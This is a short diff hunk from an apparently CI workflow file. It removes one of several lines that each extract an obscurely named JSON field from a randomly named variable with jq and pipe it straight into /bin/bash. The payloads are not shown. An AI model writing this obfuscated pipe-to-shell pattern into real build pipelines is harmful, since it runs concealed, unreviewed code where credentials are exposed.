@@ -35,7 +35,6 @@ jobs:
           echo $ul53 | jq -r .m68 | /bin/bash
           echo $n5181 | jq -r .ahx08 | /bin/bash
           printf '%s' "$shm843" | jq -r .zwisl97 | /bin/bash
-          printf '%s' "$ojl303" | jq -r .q538 | /bin/bash
           echo $mgqdh554 | jq -r .uaegy2 | /bin/bash
 
       - name: Store results
